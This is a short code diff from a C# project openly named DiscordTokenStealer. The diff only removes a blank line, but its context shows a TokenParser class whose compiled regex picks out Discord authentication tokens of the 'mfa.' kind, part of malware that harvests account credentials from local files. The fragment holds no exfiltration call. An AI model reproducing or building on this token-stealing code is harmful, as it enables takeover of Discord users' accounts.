@@ -4,7 +4,6 @@ using System.Text.RegularExpressions;
 using DiscordTokenStealer.DirectorySearchProviders;
 
 namespace DiscordTokenStealer;
-
 public static class TokenParser
 {
     private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);
